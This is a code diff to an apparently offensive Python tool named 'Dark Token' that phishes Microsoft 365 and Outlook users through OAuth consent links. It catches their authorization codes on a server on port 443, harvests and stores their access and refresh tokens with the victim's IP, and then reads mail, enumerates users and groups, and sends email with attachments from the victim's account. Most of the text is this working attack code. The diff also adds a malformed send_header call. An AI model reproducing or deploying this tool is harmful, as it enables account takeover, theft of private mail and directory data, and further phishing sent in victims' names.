@@ -34,9 +34,9 @@ create an app at apps.dev.microsoft.com, platform must be web.
 
 import BaseHTTPServer, httplib, ssl, thread
 from BaseHTTPServer import BaseHTTPRequestHandler
-import json
+import json, logging
 from urlparse import urlparse, parse_qs
-import urllib
+import urllib, time
 import os, base64, mimetypes, ConfigParser
 from os import system
 from tinydb import TinyDB, Query
@@ -145,26 +145,36 @@ if os.path.isfile('darktokenDB.json'):
 
 class AuthorizationHandler(BaseHTTPRequestHandler):
 	def do_GET(self):
+		global CLIENT_IP
+		global EMAILDOMAIN
+		CLIENT_IP = self.client_address[0]
 		url_params = urlparse(self.path).query
 		if url_params:
-			auth_code = parse_qs(url_params)['code'][0]
+			try:
+				auth_code = parse_qs(url_params)['code'][0]
+			except:
+				auth_code = ''
+				error = parse_qs(url_params)['error'][0]
 			if auth_code:
-				global CLIENT_IP
-				CLIENT_IP = self.client_address[0]
 				get_access_token(auth_code)
 				# Redirect target for operation safe.
 				self.send_response(307) # StatusTemporaryRedirect
 				if EMAILDOMAIN.__contains__('@outlook.com'):
 					self.send_header('Location','https://outlook.live.com/')
 				else:
-					self.send_header('Location','https://outlook.office365.com/')
+					self.send_header('https://outlook.office365.com/')
 				self.end_headers()
+			elif error == 'access_denied':
+				self.send_response(307)
+				self.send_header('Location','https://www.office.com/')
+				self.end_headers()
+				darktoken_msg('[!] %s rejected Dark Token request.' % CLIENT_IP)
 	def log_message(self, format, *args):
 		return
 	def do_POST(self):
 		global HTTPD
 		if self.path.startswith('/shutdown'):
-			print '[!] Shutting down Dark Token Server...'	
+			darktoken_msg('[!] Shutting down Dark Token Server...')
 			def stop_server(server):
 				server.shutdown()
 				server.server_close()
@@ -191,6 +201,7 @@ def httpRequest(url, payload, access_token_authorization_bearer=None, method='PO
 	return conn.getresponse()
 
 def get_access_token(code):
+	global EMAILDOMAIN
 	payload = {
 		'grant_type': 'authorization_code',
  		'client_id': '',
@@ -205,8 +216,11 @@ def get_access_token(code):
 	resp_body = resp.read()
 	res_json = json.loads(resp_body.decode('utf-8'))
 
-	account = get_account_profile(res_json['access_token'])
-	store_token(account['userPrincipalName'], res_json['access_token'], res_json['id_token'], res_json['refresh_token'])
+	try:
+		account = get_account_profile(res_json['access_token'])
+		store_token(account['userPrincipalName'], res_json['access_token'], res_json['id_token'], res_json['refresh_token'])
+	except:
+		EMAILDOMAIN = ''
 
 def refresh_access_token(account, refresh_token, client_ip):
 	payload = {
@@ -229,7 +243,7 @@ def get_account_profile(access_token):
 	res_json = json.loads(resp_body.decode('utf-8'))
 	EMAILDOMAIN = res_json['userPrincipalName']
 
-	print colors.green + '[*] Pwned: Got Access Token for ' + res_json['userPrincipalName'] + ' - ' + CLIENT_IP + colors.end
+	darktoken_msg('[*] Pwned: Got Access Token for %s - %s' %(res_json['userPrincipalName'], CLIENT_IP + colors.end))
 	return res_json
 
 def get_account_messages(access_token):
@@ -268,7 +282,7 @@ def send_email(access_token):
 
 	mail = httpRequest(API['base']+API['message']+'/'+res_json['id']+'/send', '', access_token, headers={'Content-Length	': '0'})
 	if mail.status == 202:
-		print '[*] Email Sent!'
+		darktoken_msg('[*] Email Sent!')
 
 def add_attachments(access_token, message_id, filename, content_bytes, mime_type, headers):
 	payload = {
@@ -283,7 +297,7 @@ def add_attachments(access_token, message_id, filename, content_bytes, mime_type
 	res_json = json.loads(resp_body.decode('utf-8'))
 
 	if resp.status == 201:
-		print '[*] File: [%s] Attached!' % filename
+		darktoken_msg('[*] File: [%s] Attached!' % filename)
 
 def get_users(access_token):
 	resp = httpRequest(API['base']+API['users'], '', access_token, 'GET')
@@ -306,15 +320,15 @@ def get_mygroups(access_token):
 def start_server():
 	global HTTPD
 	if not APP_CONFIG['client_id'] or not APP_CONFIG['client_secret'] or not APP_CONFIG['redirect_uri']:
-		print '[!] Please check your app config.'
+		darktoken_msg('[!] Please check your app config.')
 	else:
 		try:
 			HTTPD = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), AuthorizationHandler)
-			print '[!] Starting Dark Token Server...'
+			darktoken_msg('[!] Starting Dark Token Server...')
 			HTTPD.socket = ssl.wrap_socket (HTTPD.socket, keyfile=CERT_CONFIG['keyfile'], certfile=CERT_CONFIG['certfile'], server_side=True)
 			HTTPD.serve_forever()
 		except:
-			print '[!] Server is already started.'
+			darktoken_msg('[!] Server is already started.')
 	
 def stop_server():
 	try:
@@ -347,9 +361,14 @@ def store_token(account, access_token, id_token, refresh_token, client_ip=''):
 		darktoken_db.update({'access_token': access_token, 'id_token': id_token, 'refresh_token': refresh_token, 'CLIENT_IP': CLIENT_IP}, token.account == account)
 	else:
 		darktoken_db.insert({'account': account, 'access_token': access_token, 'id_token': id_token, 'refresh_token': refresh_token, 'CLIENT_IP': CLIENT_IP})
-	
 
-print '[!] Starting Dark Token...'
+def darktoken_msg(message):
+	logging.basicConfig(filename='darktoken.log',level=logging.DEBUG, format='%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
+	logging.Formatter.converter = time.gmtime
+	logging.info(message)
+	print message
+
+darktoken_msg('[!] Starting Dark Token...')
 
 while True:
 	SIGNAL = raw_input('[*]> ')
@@ -359,67 +378,71 @@ while True:
 		stop_server()
 	elif SIGNAL.__contains__('renew token'):
 		id = SIGNAL.split()[2]
-		print '[+] Trying To Renew Available Tokens: ' + TOKENS[int(id)][0]
+		darktoken_msg('[+] Trying To Renew Available Tokens: %s' % TOKENS[int(id)][0])
 		if TOKENS:
-			refresh_access_token(TOKENS[int(id)][0], TOKENS[int(id)][3], TOKENS[int(id)][4])
+			try:
+				refresh_access_token(TOKENS[int(id)][0], TOKENS[int(id)][3], TOKENS[int(id)][4])
+				darktoken_msg('[+] Token Renewed Successfully.')
+			except:
+				darktoken_msg('[!] Unable To Renew Token.')
 		else:
-			print '[!] 0 tokens found in the database.'
+			darktoken_msg('[!] 0 Tokens Found In The Database.')
 	elif SIGNAL.__contains__('list tokens'):
-		print '[!] Listing Available Tokens:'
+		darktoken_msg('[!] Listing Available Tokens:')
 		try:
 			for i in range(len(TOKENS)):
-				print colors.allwhite + '-' * int(columns) + colors.end
-				print 'ID = [' + str(i) + '] - Account: ' + TOKENS[i][0]
-				print 'Access_Token: ' + TOKENS[i][1]
-				print 'Refresh_token: ' + TOKENS[i][3]
-				print 'Client IP: ' + TOKENS[i][4]
+				darktoken_msg(colors.allwhite + '-' * int(columns) + colors.end)
+				darktoken_msg('ID = [' + str(i) + '] - Account: ' + TOKENS[i][0])
+				darktoken_msg('Access_Token: ' + TOKENS[i][1])
+				darktoken_msg('Refresh_token: ' + TOKENS[i][3])
+				darktoken_msg('Client IP: ' + TOKENS[i][4])
 		except NameError:
-			print '[!] 0 tokens found in the database.'
+			darktoken_msg('[!] 0 Tokens Found In The Database.')
 			pass
 	elif SIGNAL.__contains__('list users'):
 		id = SIGNAL.split()[2]
 		try:
 			users = get_users(TOKENS[int(id)][1])
 			for i in range(len(users['value'])):
-				print colors.allwhite + '-' * int(columns) + colors.end
-				print colors.white + 'Display Name: ' + str(users['value'][i]['displayName']) + colors.end
-				print colors.white + 'User Principal Name: ' + str(users['value'][i]['userPrincipalName']) + colors.end
-				print colors.white + 'Business Phone: ' + str(users['value'][i]['businessPhones']) + colors.end
-				print colors.white + 'Job Title: ' + str(users['value'][i]['jobTitle']) + colors.end
-				print colors.white + 'Mail: ' + str(users['value'][i]['mail']) + colors.end
-				print colors.white + 'Mobile Phone: ' + str(users['value'][i]['mobilePhone']) + colors.end
-				print colors.white + 'Office Location: ' + str(users['value'][i]['officeLocation']) + colors.end
+				darktoken_msg(colors.allwhite + '-' * int(columns) + colors.end)
+				darktoken_msg(colors.white + 'Display Name: ' + str(users['value'][i]['displayName']) + colors.end)
+				darktoken_msg(colors.white + 'User Principal Name: ' + str(users['value'][i]['userPrincipalName']) + colors.end)
+				darktoken_msg(colors.white + 'Business Phone: ' + str(users['value'][i]['businessPhones']) + colors.end)
+				darktoken_msg(colors.white + 'Job Title: ' + str(users['value'][i]['jobTitle']) + colors.end)
+				darktoken_msg(colors.white + 'Mail: ' + str(users['value'][i]['mail']) + colors.end)
+				darktoken_msg(colors.white + 'Mobile Phone: ' + str(users['value'][i]['mobilePhone']) + colors.end)
+				darktoken_msg(colors.white + 'Office Location: ' + str(users['value'][i]['officeLocation']) + colors.end)
 		except:
-			print '[!] 0 users found in the database.'
+			darktoken_msg('[!] 0 Users Found In The Database.')
 	elif SIGNAL.__contains__('list groups'):
 		id = SIGNAL.split()[2]
 		try:
 			groups = get_groups(TOKENS[int(id)][1])
 			for i in range(len(groups['value'])):
-				print colors.allwhite + '-' * int(columns) + colors.end
-				print color.white + str(groups['value'][i])
+				darktoken_msg(colors.allwhite + '-' * int(columns) + colors.end)
+				darktoken_msg(color.white + str(groups['value'][i]))
 		except:
-			print '[!] 0 groups found in the database.' 
+			darktoken_msg('[!] 0 Groups Found In The Database.')
 	elif SIGNAL.__contains__('list my groups'):
 		id = SIGNAL.split()[3]
 		try:
 			groups = get_mygroups(TOKENS[int(id)][1])
 			for i in range(len(groups['value'])):
-				print colors.allwhite + '-' * int(columns) + colors.end
-				print color.white + str(groups['value'][i])
+				darktoken_msg(colors.allwhite + '-' * int(columns) + colors.end)
+				darktoken_msg(color.white + str(groups['value'][i]))
 		except:
-			print '[!] 0 groups found in the database.'
+			darktoken_msg('[!] 0 Groups Found In The Database.')
 	elif SIGNAL.__contains__('list message'):
 		id = SIGNAL.split()[2]
 		try:
 			msg = get_account_messages(TOKENS[int(id)][1])
 			for i in range(len(msg['value'])):
-				print colors.allwhite + '-' * int(columns) + colors.end
-				print colors.blue + 'Subject: ' + msg['value'][i]['subject'] + colors.end
-				print colors.blue + 'Body:' + colors.end
-				print colors.white + msg['value'][i]['bodyPreview'] + colors.end
+				darktoken_msg(colors.allwhite + '-' * int(columns) + colors.end)
+				darktoken_msg(colors.blue + 'Subject: ' + msg['value'][i]['subject'] + colors.end)
+				darktoken_msg(colors.blue + 'Body:' + colors.end)
+				darktoken_msg(colors.white + msg['value'][i]['bodyPreview'] + colors.end)
 		except NameError:
-			print '[!] 0 messages found in the database.'
+			darktoken_msg('[!] 0 Messages Found In The Database.')
 			pass
 	elif SIGNAL.__contains__('send email'):
 		id = SIGNAL.split()[2]
@@ -427,10 +450,10 @@ while True:
 	elif SIGNAL.__contains__('clear'):
 		system('clear')
 	elif SIGNAL.__contains__('show app config'):
-		print "client_id: %s" % str(APP_CONFIG['client_id'])
-		print "scope: %s" % str(APP_CONFIG['scope'])
-		print "client_secret: %s" % str(APP_CONFIG['client_secret'])
-		print "redirect_uri: %s" % str(APP_CONFIG['redirect_uri'])
+		darktoken_msg("client_id: %s" % str(APP_CONFIG['client_id']))
+		darktoken_msg("scope: %s" % str(APP_CONFIG['scope']))
+		darktoken_msg("client_secret: %s" % str(APP_CONFIG['client_secret']))
+		darktoken_msg("redirect_uri: %s" % str(APP_CONFIG['redirect_uri']))
 	elif SIGNAL.__contains__('set client_id'):
 		client_id = SIGNAL.split()[2]
 		APP_CONFIG['client_id'] = client_id
@@ -445,17 +468,17 @@ while True:
 		APP_CONFIG['redirect_uri'] = redirect_uri
 	elif SIGNAL.__contains__('generate link'):
 		try:
-			print "\nhttps://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=%s&response_type=code&redirect_uri=%s&response_mode=query&scope=%s&state=12345\n" % (str(APP_CONFIG['client_id']), urllib.quote(APP_CONFIG['redirect_uri']), urllib.quote(APP_CONFIG['scope']))
+			darktoken_msg("\nhttps://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=%s&response_type=code&redirect_uri=%s&response_mode=query&scope=%s&state=12345\n" % (str(APP_CONFIG['client_id']), urllib.quote(APP_CONFIG['redirect_uri']), urllib.quote(APP_CONFIG['scope'])))
 		except:
 			pass
 	elif SIGNAL.__contains__('show email config'):
-		print "subject: %s" % str(EMAIL_CONFIG['subject'])
-		print "importance: %s" % str(EMAIL_CONFIG['importance'])
-		print "contentType: %s" % str(EMAIL_CONFIG['contentType'])
-		print "content: %s" % str(EMAIL_CONFIG['content'])
-		print "recipient address: %s" % str(EMAIL_CONFIG['address'])
+		darktoken_msg("subject: %s" % str(EMAIL_CONFIG['subject']))
+		darktoken_msg("importance: %s" % str(EMAIL_CONFIG['importance']))
+		darktoken_msg("contentType: %s" % str(EMAIL_CONFIG['contentType']))
+		darktoken_msg("content: %s" % str(EMAIL_CONFIG['content']))
+		darktoken_msg("recipient address: %s" % str(EMAIL_CONFIG['address']))
 		for filepath in EMAIL_CONFIG['attachments']:
-			print "Attachment [%s]: [%s]" % (str(EMAIL_CONFIG['attachments'].index(filepath)+1), str(filepath))
+			darktoken_msg("Attachment [%s]: [%s]" % (str(EMAIL_CONFIG['attachments'].index(filepath)+1), str(filepath)))
 	elif SIGNAL.__contains__('set subject'):
 		subject = raw_input('Subject: ')
 		EMAIL_CONFIG['subject'] = subject
@@ -472,7 +495,7 @@ while True:
 		address = SIGNAL.split()[2]
 		EMAIL_CONFIG['address'] = address
 	elif SIGNAL.__contains__('set attachments'):
-		print 'Paste your file location, one per line. When you\'re finished, press enter on an empty line'
+		darktoken_msg('Paste your file location, one per line. When you\'re finished, press enter on an empty line')
 		file = 'None'
 		while file:
 			file = raw_input('File Location: ')
@@ -485,4 +508,4 @@ while True:
 	elif SIGNAL.__contains__('exit'):
 		break
 	else:
-		print "[!] Unknown Command. '%s' - Type help." % str(SIGNAL)
+		darktoken_msg("[!] Unknown Command. '%s' - Type help." % str(SIGNAL))
